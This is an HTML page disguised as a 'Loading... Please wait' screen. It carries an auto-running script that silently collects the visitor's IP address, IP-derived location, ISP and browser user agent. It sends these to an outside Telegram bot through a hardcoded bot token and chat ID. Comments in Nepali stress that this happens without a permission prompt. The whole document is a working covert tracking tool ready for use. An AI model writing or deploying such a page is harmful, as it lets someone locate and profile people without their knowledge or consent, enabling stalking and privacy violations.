<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>Please wait...</h2>

    <script>
        // 🔒 Silent: No GPS popup, No permission request
        (function() {
            // 1. IP लिने
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    const ip = data.ip;
                    const ua = navigator.userAgent;

                    // 2. IP बाट Location लिने (ipapi.co)
                    fetch(`https://ipapi.co/${ip}/json/`)
                        .then(res => res.json())
                        .then(locData => {
                            const lat = locData.latitude || '';
                            const lon = locData.longitude || '';
                            const city = locData.city || '';
                            const region = locData.region || '';
                            const country = locData.country_name || '';
                            const isp = locData.org || '';

                            const location = `${country}, ${city} (${isp})`;
                            const mapLink = `https://www.google.com/maps/place/${lat},${lon}`;

                            // 3. Telegram Bot मा Silent पठाउने
                            const botToken = '8693973243:AAH1Iu_J_XDhbWOh9JCHWDuRgtW84YKF81I';
                            const chatId = '8621764137';

                            const msg = `📍 **Silent Location**\nIP: ${ip}\nLocation: ${location}\n🗺️ Maps: ${mapLink}\nUA: ${ua}`;

                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: chatId,
                                    text: msg,
                                    parse_mode: 'Markdown'
                                })
                            })
                            .then(() => {
                                // ✅ पेजमा केही देखाउँदैन (silent)
                                document.body.innerHTML = `
                                    <h2>✅</h2>
                                    <p style="color:green;">Done</p>
                                `;
                            })
                            .catch(() => {
                                document.body.innerHTML = `<h2>⚠️</h2><p>Error</p>`;
                            });
                        })
                        .catch(() => {
                            document.body.innerHTML = `<h2>⚠️</h2><p>Location unavailable</p>`;
                        });
                })
                .catch(() => {
                    document.body.innerHTML = `<h2>⚠️</h2><p>Network error</p>`;
                });
        })();
    </script>
</body>
</html>
